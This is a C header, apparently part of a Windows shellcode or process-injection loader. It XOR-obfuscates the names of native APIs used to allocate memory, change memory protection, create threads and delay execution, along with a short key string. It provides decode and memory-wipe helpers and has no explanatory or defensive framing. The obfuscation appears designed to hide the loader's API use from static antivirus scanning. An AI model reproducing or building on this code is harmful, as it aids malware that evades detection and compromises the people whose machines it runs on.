#pragma once
#include <stddef.h>
#include <windows.h>

/* --- compile-time XOR encoding helper --- */

#define OBF_KEY 0x5A

#define OBF_CHAR(c) ((c) ^ OBF_KEY)

/* --- secure wipe that MSVC will not optimize away --- */

static __forceinline void secure_zero(void* p, size_t n) {
    volatile unsigned char* vp = (volatile unsigned char*)p;
    while (n--) {
        *vp++ = 0;
    }
}

/* --- decode helper --- */

static __forceinline void obf_decode(
    unsigned char* dst,
    const unsigned char* src,
    size_t len
) {
    for (size_t i = 0; i < len; i++) {
        dst[i] = src[i] ^ OBF_KEY;
    }
}

static const unsigned char s_NtAllocateVirtualMemory[] = {
    OBF_CHAR('N'), OBF_CHAR('t'), OBF_CHAR('A'),
    OBF_CHAR('l'), OBF_CHAR('l'), OBF_CHAR('o'),
    OBF_CHAR('c'), OBF_CHAR('a'), OBF_CHAR('t'),
    OBF_CHAR('e'), OBF_CHAR('V'), OBF_CHAR('i'),
    OBF_CHAR('r'), OBF_CHAR('t'), OBF_CHAR('u'),
    OBF_CHAR('a'), OBF_CHAR('l'), OBF_CHAR('M'),
    OBF_CHAR('e'), OBF_CHAR('m'), OBF_CHAR('o'),
    OBF_CHAR('r'), OBF_CHAR('y'), OBF_CHAR('\0')
};

static const unsigned char s_NtProtectVirtualMemory[] = {
    OBF_CHAR('N'), OBF_CHAR('t'), OBF_CHAR('P'),
    OBF_CHAR('r'), OBF_CHAR('o'), OBF_CHAR('t'),
    OBF_CHAR('e'), OBF_CHAR('c'), OBF_CHAR('t'),
    OBF_CHAR('V'), OBF_CHAR('i'), OBF_CHAR('r'),
    OBF_CHAR('t'), OBF_CHAR('u'), OBF_CHAR('a'),
    OBF_CHAR('l'), OBF_CHAR('M'), OBF_CHAR('e'),
    OBF_CHAR('m'), OBF_CHAR('o'), OBF_CHAR('r'),
    OBF_CHAR('y'), OBF_CHAR('\0')
};

static const unsigned char s_NtCreateThreadEx[] = {
    OBF_CHAR('N'), OBF_CHAR('t'), OBF_CHAR('C'), OBF_CHAR('r'),
    OBF_CHAR('e'), OBF_CHAR('a'), OBF_CHAR('t'), OBF_CHAR('e'),
    OBF_CHAR('T'), OBF_CHAR('h'), OBF_CHAR('r'), OBF_CHAR('e'),
    OBF_CHAR('a'), OBF_CHAR('d'), OBF_CHAR('E'), OBF_CHAR('x'),
    OBF_CHAR('\0')
};

static const unsigned char s_NtDelayExecution[] = {
    OBF_CHAR('N'), OBF_CHAR('t'), OBF_CHAR('D'),
    OBF_CHAR('e'), OBF_CHAR('l'), OBF_CHAR('a'),
    OBF_CHAR('y'), OBF_CHAR('E'), OBF_CHAR('x'),
    OBF_CHAR('e'), OBF_CHAR('c'), OBF_CHAR('u'),
    OBF_CHAR('t'), OBF_CHAR('i'), OBF_CHAR('o'),
    OBF_CHAR('n'), OBF_CHAR('\0')
};

static const unsigned char s_NtWaitForSingleObject[] = {
    OBF_CHAR('N'), OBF_CHAR('t'), OBF_CHAR('W'),
    OBF_CHAR('a'), OBF_CHAR('i'), OBF_CHAR('t'),
    OBF_CHAR('F'), OBF_CHAR('o'), OBF_CHAR('r'),
    OBF_CHAR('S'), OBF_CHAR('i'), OBF_CHAR('n'),
    OBF_CHAR('g'), OBF_CHAR('l'), OBF_CHAR('e'),
    OBF_CHAR('O'), OBF_CHAR('b'), OBF_CHAR('j'),
    OBF_CHAR('e'), OBF_CHAR('c'), OBF_CHAR('t'),
    OBF_CHAR('\0')
};

static const unsigned char s_key[] = {
    OBF_CHAR('h'), OBF_CHAR('o'), OBF_CHAR('n'),
    OBF_CHAR('e'), OBF_CHAR('s'), OBF_CHAR('t'),
    OBF_CHAR('\0')
};